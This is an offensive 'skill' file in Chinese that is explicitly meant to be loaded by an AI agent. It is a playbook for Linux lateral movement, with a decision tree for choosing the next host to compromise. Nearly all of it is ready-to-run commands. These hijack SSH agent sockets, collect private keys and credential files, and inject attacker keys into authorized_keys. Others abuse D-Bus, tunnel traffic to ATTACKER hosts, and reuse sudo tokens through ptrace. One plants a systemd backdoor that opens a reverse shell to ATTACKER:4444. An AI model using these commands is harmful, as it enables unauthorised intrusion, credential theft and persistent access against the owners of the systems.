# 技能：Linux 横向移动 — 专家攻击手册

> **AI 加载指令**：专家级 Linux 横向移动技术。涵盖 SSH 代理劫持、密钥收集、凭证位置、D-Bus 利用、网络中继、sudo 令牌重用和 systemd 操作。基础模型会遗漏 SSH_AUTH_SOCK 劫持和基于 ptrace 的 sudo 会话劫持。

## 0. 相关路由

在深入之前，请考虑加载：

- 如果需要在转向之前获取当前主机的 root 权限，请加载 [linux-privilege-escalation](../linux-privilege-escalation/SKILL.md)
- 当受限 shell 或安全模块阻止横向移动工具时，请加载 [linux-security-bypass](../linux-security-bypass/SKILL.md)
- 当目标网络包含容器化主机时，请加载 [container-escape-techniques](../container-escape-techniques/SKILL.md)
- 当转向 Kubernetes 集群时，请加载 [kubernetes-pentesting](../kubernetes-pentesting/SKILL.md)
- 用于利用发现的内部服务（Redis、MongoDB 等），请加载 [unauthorized-access-common-services](../unauthorized-access-common-services/SKILL.md)

---

## 1. SSH 代理劫持

### 1.1 查找 SSH 代理套接字

```bash
# 以 root 身份（或具有访问其他用户进程权限的用户）：
find /tmp -path "*/ssh-*" -name "agent.*" 2>/dev/null
# 或通过 /proc：
grep -r SSH_AUTH_SOCK /proc/*/environ 2>/dev/null | tr '\0' '\n'

# 典型路径：/tmp/ssh-XXXXXX/agent.PID
```

### 1.2 劫持代理转发

```bash
# 将找到的套接字设置为我们的认证代理
export SSH_AUTH_SOCK=/tmp/ssh-AbCdEf/agent.12345

# 列出代理中的可用密钥
ssh-add -l
# 如果密钥出现 → 我们可以使用它们

# SSH 到该代理可以认证的任何主机
ssh -o StrictHostKeyChecking=no user@internal-host

# 代理所有者不会注意到 — 我们正在使用他们转发的代理
```

### 1.3 持久化代理监控

```bash
# 监控新的 SSH 代理套接字（等待管理员 SSH 登录）
inotifywait -m /tmp -e create 2>/dev/null | grep ssh-
# 或轮询：
while true; do
    find /tmp -path "*/ssh-*" -name "agent.*" -newer /tmp/.marker 2>/dev/null
    touch /tmp/.marker
    sleep 5
done
```

---

## 2. SSH 密钥收集

### 2.1 私有密钥位置

```bash
find / -name "id_rsa" -o -name "id_ed25519" -o -name "*.pem" -o -name "*.key" 2>/dev/null
# 也包括：/etc/ssh/ssh_host_*_key (MITM), /home/*/.ssh/id_*

# 查找无密码的密钥：
for key in $(find / -name "id_*" ! -name "*.pub" 2>/dev/null); do
    ssh-keygen -y -P "" -f "$key" > /dev/null 2>&1 && echo "NO PASSPHRASE: $key"
done
```

### 2.2 known_hosts 解析

```bash
# 哈希化的 known_hosts（常见默认值）：
cat ~/.ssh/known_hosts
# 可能是哈希化的 — 使用 ssh-keygen 检查已知 IP：
ssh-keygen -F 10.0.0.1 -f ~/.ssh/known_hosts

# 未哈希化的 known_hosts → 直接 IP/主机名列表
awk '{print $1}' ~/.ssh/known_hosts | sort -u

# 从所有用户的 known_hosts 中提取所有主机名/IP
cat /home/*/.ssh/known_hosts /root/.ssh/known_hosts 2>/dev/null \
  | awk '{print $1}' | tr ',' '\n' | sort -u
```

### 2.3 authorized_keys 注入

```bash
# 在攻击者主机上生成攻击者密钥对
ssh-keygen -t ed25519 -f /tmp/pivot_key -N ""

# 在受攻击主机上注入公钥
echo "ssh-ed25519 AAAA...attacker_pubkey..." >> /root/.ssh/authorized_keys
echo "ssh-ed25519 AAAA...attacker_pubkey..." >> /home/admin/.ssh/authorized_keys

# 使用我们的密钥 SSH 回去
ssh -i /tmp/pivot_key root@target
```

---

## 3. 凭证收集位置

### 3.1 系统凭证

| 位置 | 内容 | 命令 |
|---|---|---|
| `/etc/shadow` | 密码哈希 | `cat /etc/shadow` (root) |
| `/etc/passwd` | 用户列表，可能包含哈希 | `cat /etc/passwd` |
| `.bash_history` | 命令历史（明文密码） | `cat /home/*/.bash_history` |
| `.mysql_history` | MySQL 命令（含密码） | `cat /home/*/.mysql_history` |
| `.psql_history` | PostgreSQL 命令 | `cat /home/*/.psql_history` |
| `.pgpass` | PostgreSQL 密码文件 | `cat /home/*/.pgpass` |
| `.my.cnf` | MySQL 凭证 | `cat /home/*/.my.cnf` |
| `.netrc` | FTP/HTTP 自动登录凭证 | `cat /home/*/.netrc` |
| `.git-credentials` | Git HTTPS 密码 | `cat /home/*/.git-credentials` |

### 3.2 环境和配置文件

```bash
# 当前进程秘密
env | grep -iE "pass|key|secret|token|api|cred|auth"

# 所有进程环境（root）：
for pid in /proc/[0-9]*; do
    cat $pid/environ 2>/dev/null | tr '\0' '\n' | grep -iE "pass|key|secret|token"
done

# 应用程序配置（常见凭证位置）：
find /var/www /opt /srv -name "wp-config.php" -o -name "settings.py" \
     -o -name "*.env" -o -name "database.yml" -o -name "docker-compose.yml" 2>/dev/null

# 密钥环和秘密存储：
find / -name "*.keyring" -o -name ".vault-token" -o -path "*/.password-store/*.gpg" 2>/dev/null
```

---

## 4. D-Bus 利用

### 4.1 列举 D-Bus 服务

```bash
# 列出系统总线服务
dbus-send --system --dest=org.freedesktop.DBus \
  --type=method_call --print-reply \
  /org/freedesktop/DBus org.freedesktop.DBus.ListNames

# 列出会话总线服务
dbus-send --session --dest=org.freedesktop.DBus \
  --type=method_call --print-reply \
  /org/freedesktop/DBus org.freedesktop.DBus.ListNames

# 检视服务（查找可用方法）
dbus-send --system --dest=org.freedesktop.systemd1 \
  --type=method_call --print-reply \
  /org/freedesktop/systemd1 org.freedesktop.DBus.Introspectable.Introspect
```

### 4.2 通过 D-Bus 滥用 systemd & PolicyKit

```bash
# 通过 D-Bus 启动服务（如果策略允许）：
dbus-send --system --dest=org.freedesktop.systemd1 \
  --type=method_call --print-reply /org/freedesktop/systemd1 \
  org.freedesktop.systemd1.Manager.StartUnit \
  string:"malicious.service" string:"replace"

# polkit 可用的动作（无需认证）：
pkaction --verbose 2>/dev/null | grep -B5 "implicit active: yes"
```

---

## 5. 内部网络中继

### 5.1 SSH 隧道

```bash
# 本地端口转发：通过 localhost:3306 访问 INTERNAL_HOST:3306
ssh -L 3306:INTERNAL_HOST:3306 pivot@compromised-host

# 远程端口转发：将攻击者服务暴露给内部网络
ssh -R 8080:ATTACKER:8080 pivot@compromised-host

# 动态 SOCKS 代理：通过中继路由所有流量
ssh -D 1080 pivot@compromised-host
# 然后：proxychains nmap -sT INTERNAL_RANGE

# 通过 SSH over SSH（多跳）：
ssh -J user1@hop1,user2@hop2 target@final-host
```

### 5.2 无 SSH — 替代隧道

```bash
# socat 端口转发
socat TCP-LISTEN:8080,fork TCP:INTERNAL_HOST:80 &

# ncat 中继
ncat -l -p 8080 --sh-exec "ncat INTERNAL_HOST 80"

# /dev/tcp（Bash 内置，无需工具）
exec 3<>/dev/tcp/INTERNAL_HOST/80
echo -e "GET / HTTP/1.0\r\nHost: INTERNAL_HOST\r\n\r\n" >&3
cat <&3

# chisel（通过 HTTP 的 SOCKS 代理）
# 在攻击者主机：chisel server -p 8080 --reverse
# 在目标主机：chisel client ATTACKER:8080 R:socks
```

### 5.3 从受攻击主机进行网络发现

```bash
ss -tlnp && ss -tnp                  # 监听和已建立连接
arp -a && ip neigh                    # 已知的相邻主机
cat /etc/resolv.conf                  # DNS 服务器
dig axfr internal.domain @dns 2>/dev/null   # 区域传输

# 子网扫描（仅 bash，无需工具）：
for i in $(seq 1 254); do ping -c1 -W1 10.0.0.$i &>/dev/null && echo "ALIVE: 10.0.0.$i" & done; wait

# 通过 /dev/tcp 进行端口扫描：
for port in 22 80 443 3306 5432 6379 8080; do
    (echo >/dev/tcp/10.0.0.1/$port) 2>/dev/null && echo "OPEN: $port"
done
```

---

## 6. 共享文件系统利用

### 6.1 NFS 挂载

```bash
# 发现 NFS 共享
showmount -e FILESERVER_IP 2>/dev/null

# 检查无 root_squash（root 映射到 root）
mount -t nfs FILESERVER_IP:/share /mnt/nfs
# 如果无 root_squash：创建对其他主机可见的 SUID 二进制文件

# 所有主机挂载同一共享 → SUID 二进制文件 = 在所有主机上 root
cp /bin/bash /mnt/nfs/bash && chmod +s /mnt/nfs/bash
```

### 6.2 SMB/CIFS 共享

```bash
# 列举共享
smbclient -L //FILESERVER_IP/ -N 2>/dev/null      # 空会话
smbclient -L //FILESERVER_IP/ -U 'user%password'

# 挂载并搜索凭证
mount -t cifs //FILESERVER_IP/share /mnt/smb -o username=user,password=pass
find /mnt/smb -name "*.conf" -o -name "*.cfg" -o -name "*.kdbx" \
     -o -name "*.xlsx" -o -name "*.docx" 2>/dev/null
```

---

## 7. SUDO 令牌重用（基于 ptrace）

```bash
# 如果另一个用户有活动的 sudo 会话（时间戳未过期）：
# 并且我们可以 ptrace 他们的进程（相同 UID 或 root）

# 检查 sudo 时间戳文件：
ls -la /var/run/sudo/ts/ 2>/dev/null
ls -la /var/db/sudo/ 2>/dev/null
# 这些文件的存在表示活动 sudo 令牌

# 基于 ptrace 的劫持：
# 附加到用户的 shell 进程
# 注入：sudo /bin/bash
# 注入的 sudo 继承有效的 timestamp → 无需密码

# 自动化工具：sudo_inject
# https://github.com/nongiach/sudo_inject
# 注入到具有有效 sudo 令牌的进程
```

---

## 8. systemd 服务操作

```bash
# 查找可写的单元文件：
find /etc/systemd /usr/lib/systemd -writable -name "*.service" 2>/dev/null

# 注入到现有服务（添加 ExecStartPre=）：
# 或创建新的：/etc/systemd/system/backdoor.service
# [Service] Type=oneshot ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'
systemctl daemon-reload && systemctl enable --now backdoor.service
```

---

## 9. 横向移动决策树

```
受攻击主机 — 下一步移动到哪里？
│
├── 可用 SSH 凭证？
│   ├── 找到私有密钥？ → 尝试在所有 known_hosts 目标上使用（§2）
│   ├── SSH 代理运行？ → 劫持套接字（§1）
│   ├── 历史记录/配置中包含密码？ → 在主机上喷洒（§3）
│   └── 其他主机上的 authorized_keys 可写？ → 注入密钥（§2.3）
│
├── 发现网络服务？
│   ├── 内部 Web 应用？ → 隧道 + 攻击（§5.1）
│   ├── 数据库（3306/5432/6379）？ → 检查收集的凭证（§3）
│   ├── SMB/NFS 共享？ → 挂载 + 搜索凭证/SUID（§6）
│   └── Kubernetes API (6443)？ → 加载 kubernetes-pentesting 技能
│
├── 可以访问其他主机？
│   ├── 直接 SSH？ → 使用密钥/密码
│   ├── 防火墙？ → SSH 隧道或 chisel（§5）
│   └── 无工具？ → /dev/tcp + bash（§5.2）
│
├── 当前主机上具有 root？
│   ├── 读取 /etc/shadow → 碎片哈希 → 密码重用（§3）
│   ├── 倾倒 /proc/*/environ → 查找服务凭证（§3.2）
│   ├── 劫持 sudo 令牌 → 乘搭管理员会话（§7）
│   └── 修改 systemd 服务 → 后门（§8）
│
├── 可用 D-Bus 服务？
│   ├── 特权服务暴露？ → 方法调用滥用（§4）
│   └── polkit 动作无需认证？ → 特权操作（§4.3）
│
└── 没有明显的路径？
    ├── ARP 扫描 + 端口扫描内部网络（§5.3）
    ├── 被动凭证嗅探（如果 cap_net_raw）
    ├── 等待管理员 SSH → 代理劫持（§1.3）
    └── 检查云元数据（169.254.169.254）
```
